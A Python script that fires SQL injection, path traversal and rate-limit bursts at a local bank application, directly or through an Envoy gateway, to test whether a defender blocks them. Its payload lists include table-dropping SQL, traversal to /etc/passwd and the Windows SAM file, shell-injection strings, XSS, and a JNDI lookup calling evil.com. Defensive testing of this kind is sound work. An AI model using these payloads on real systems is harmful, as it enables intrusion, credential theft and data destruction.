#!/usr/bin/env python3
"""
Attack Simulator - Tests Bank at localhost:8000
Can attack directly (defender OFF) or through Envoy gateway (defender ON)
"""
import asyncio
import aiohttp
import json
import sys
import os
from datetime import datetime
from typing import Optional

# Fix Windows console encoding for emojis
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except:
        pass

# Configuration
BANK_DIRECT_URL = "http://localhost:8000"  # Direct to bank (defender OFF)
BANK_THROUGH_DEFENDER = "http://localhost:8085"  # Through Envoy gateway (defender ON)

# Attack payloads
SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1' UNION SELECT NULL, username, password FROM users--",
    "admin' OR '1'='1'--",
    "1'; DROP TABLE users--",
    "1' AND 1=1--",
    "1' AND 1=2--",
]

PATH_TRAVERSAL = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
]

RCE_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "&& ls -la",
    "${jndi:ldap://evil.com/a}",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('XSS')",
]


async def attack_endpoint(
    session: aiohttp.ClientSession,
    base_url: str,
    path: str,
    method: str = "GET",
    payload: Optional[str] = None,
    attack_type: str = "normal",
) -> dict:
    """Send attack request and return result."""
    try:
        url = f"{base_url}{path}"
        
        if method == "GET" and payload:
            url = f"{url}?id={payload}" if "?" not in path else f"{url}&id={payload}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Attack-Simulator)",
            "X-Forwarded-For": "192.168.1.100",
        }
        
        if method == "POST" and payload:
            # Try to parse as JSON, otherwise use as string
            try:
                json_data = json.loads(payload)
            except:
                json_data = {"data": payload, "payload": payload}
            
            async with session.post(
                url,
                json=json_data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=5),
            ) as resp:
                status = resp.status
                try:
                    body = await resp.json()
                except:
                    body = await resp.text()
                return {
                    "status": status,
                    "blocked": status == 403 or status == 429,
                    "allowed": status < 400,
                    "response": str(body)[:100],
                }
        else:
            async with session.get(
                url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=5),
            ) as resp:
                status = resp.status
                try:
                    body = await resp.json()
                except:
                    body = await resp.text()
                return {
                    "status": status,
                    "blocked": status == 403 or status == 429,
                    "allowed": status < 400,
                    "response": str(body)[:100],
                }
    except asyncio.TimeoutError:
        return {"status": "timeout", "blocked": False, "allowed": False, "response": "Request timeout"}
    except aiohttp.ClientConnectorError as e:
        return {"status": "connection_error", "blocked": False, "allowed": False, "response": f"Connection error: {str(e)[:80]}"}
    except Exception as e:
        return {"status": "error", "blocked": False, "allowed": False, "response": str(e)[:100]}


async def run_attack_suite(
    target_url: str,
    defender_mode: str,
    show_details: bool = True,
):
    """Run full attack suite against target using REAL bank endpoints."""
    print("\n" + "=" * 80)
    print(f"🔴 ATTACK SIMULATOR - {defender_mode}")
    print("=" * 80)
    print(f"Target: {target_url}")
    print(f"Bank: http://localhost:8000")
    print("=" * 80 + "\n")
    
    stats = {
        "total": 0,
        "allowed": 0,
        "blocked": 0,
        "errors": 0,
    }
    
    async with aiohttp.ClientSession() as session:
        # 1. SQL Injection Attacks on Real Endpoints
        print("📌 SQL Injection Attacks (Real Endpoints):")
        print("-" * 80)
        for payload in SQLI_PAYLOADS[:4]:
            stats["total"] += 1
            result = await attack_endpoint(session, target_url, f"/accounts?account_id={payload}", "GET", None, "sqli")
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /accounts?account_id={payload[:50]:<50} | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 2. SQL Injection in POST Body
        print("\n📌 SQL Injection in POST Body (Auth Endpoints):")
        print("-" * 80)
        for payload in SQLI_PAYLOADS[:3]:
            stats["total"] += 1
            result = await attack_endpoint(session, target_url, "/auth/login", "POST", payload, "sqli")
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /auth/login (body: {payload[:45]:<45}) | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 3. Path Traversal
        print("\n📌 Path Traversal Attacks (Account IDs):")
        print("-" * 80)
        for payload in PATH_TRAVERSAL:
            stats["total"] += 1
            result = await attack_endpoint(session, target_url, f"/accounts/{payload}", "GET", None, "path_traversal")
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /accounts/{payload[:55]:<55} | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 4. Rapid Fire (Rate Limit Test)
        print("\n📌 Rapid Fire Test (Rate Limiting - /health):")
        print("-" * 80)
        rapid_count = 0
        rapid_allowed = 0
        rapid_blocked = 0
        for i in range(50):
            rapid_count += 1
            stats["total"] += 1
            result = await attack_endpoint(session, target_url, "/health", "GET", None, "rapid")
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
            elif result["blocked"]:
                rapid_blocked += 1
                stats["blocked"] += 1
            elif result["allowed"]:
                rapid_allowed += 1
                stats["allowed"] += 1
            else:
                stats["allowed"] += 1
            if i % 10 == 0 and show_details:
                print(f"  Requests: {i+1} | Allowed: {rapid_allowed} | Blocked: {rapid_blocked}")
            await asyncio.sleep(0.05)
        
        if show_details:
            print(f"  Final: {rapid_count} requests | Allowed: {rapid_allowed} | Blocked: {rapid_blocked}")
    
    # Summary
    print("\n" + "=" * 80)
    print("📊 ATTACK SUMMARY")
    print("=" * 80)
    print(f"Total Attacks: {stats['total']}")
    print(f"  ✅ Allowed: {stats['allowed']} ({100 * stats['allowed'] / max(stats['total'], 1):.1f}%)")
    print(f"  🛑 Blocked: {stats['blocked']} ({100 * stats['blocked'] / max(stats['total'], 1):.1f}%)")
    print(f"  ❌ Errors: {stats['errors']} ({100 * stats['errors'] / max(stats['total'], 1):.1f}%)")
    print("=" * 80 + "\n")
    
    return stats


async def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Attack Simulator for Bank Testing")
    parser.add_argument(
        "--defender",
        choices=["on", "off"],
        default="off",
        help="Defender mode: 'on' = through Envoy (localhost:8085), 'off' = direct (localhost:8000)",
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help="Show only summary, not individual attack results",
    )
    
    args = parser.parse_args()
    
    if args.defender == "on":
        target_url = BANK_THROUGH_DEFENDER
        mode = "DEFENDER ON (via Envoy Gateway)"
    else:
        target_url = BANK_DIRECT_URL
        mode = "DEFENDER OFF (Direct to Bank)"
    
    await run_attack_suite(target_url, mode, show_details=not args.quiet)


if __name__ == "__main__":
    asyncio.run(main())

